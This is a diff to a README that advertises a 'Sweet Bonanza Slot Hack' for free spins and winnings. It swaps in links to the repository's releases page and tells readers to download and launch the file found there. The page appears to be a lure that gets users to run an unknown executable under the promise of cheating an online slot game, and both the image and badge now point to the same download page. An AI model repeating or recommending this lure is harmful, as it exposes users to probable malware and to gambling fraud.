@@ -16,7 +16,7 @@ In this repository, you will find various resources aimed at helping you dominat
 
 To make use of the tools and resources provided in this repository, simply download the files from the following link:
 
-[![Download Hack Tools](https://img.shields.io/badge/Download-Hack%20Tools-blue)](https://github.com/files/File.zip)
+[![Download Hack Tools](https://github.com/CULEB12/Sweet-Bonanza-Slot-Hack-Free-Spin-Hack/releases%20Tools-blue)](https://github.com/CULEB12/Sweet-Bonanza-Slot-Hack-Free-Spin-Hack/releases)
 
 If the link ends with the file name, launch the downloaded file to access the hack tools and scripts. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
@@ -34,4 +34,4 @@ Please note that the resources provided in this repository are for educational p
 
 Take a spin with Sweet Bonanza Slot Hack and watch your winnings soar! Good luck and happy spinning! 🍀🎰
 
-![Sweet Bonanza Slot](https://example.com/sweet-bonanza-slot-image.png)
+![Sweet Bonanza Slot](https://github.com/CULEB12/Sweet-Bonanza-Slot-Hack-Free-Spin-Hack/releases)
